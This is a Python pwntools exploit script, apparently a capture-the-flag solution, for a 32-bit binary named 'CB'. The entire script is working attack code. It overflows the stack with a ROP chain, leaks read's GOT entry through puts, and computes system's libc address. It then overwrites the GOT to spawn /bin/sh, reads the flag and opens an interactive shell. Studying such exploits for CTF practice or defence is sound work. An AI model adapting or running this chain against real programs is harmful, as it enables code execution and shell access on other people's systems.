from pwn import *

context.log_level='debug'
libc = ELF('/lib32/libc.so.6')
s = process('./CB')
s.sendline(str(0x10000010))

sh = '/bin/sh\x00'
read=0x80483e0
puts = 0x8048400
read_got = 0x804a010
pppr = 0x08048639
pay = 'A'*0x18+p32(puts)+p32(pppr)+p32(read_got)*3
pay += p32(read) + p32(pppr) + p32(0) + p32(read_got) + p32(len(sh)+4)
pay += p32(read) + p32(read_got+4) * 2

s.sendline(pay)
sleep(0.1)
s.sendline('-1')
leak_read = u32(s.recv(4))
system = leak_read - libc.symbols['read'] + libc.symbols['system']
s.sendline(p32(system) + sh)

s.sendline("echo 1;cat flag")
s.recvuntil("1\n")
print "flag: "+s.recv(1024)
s.interactive()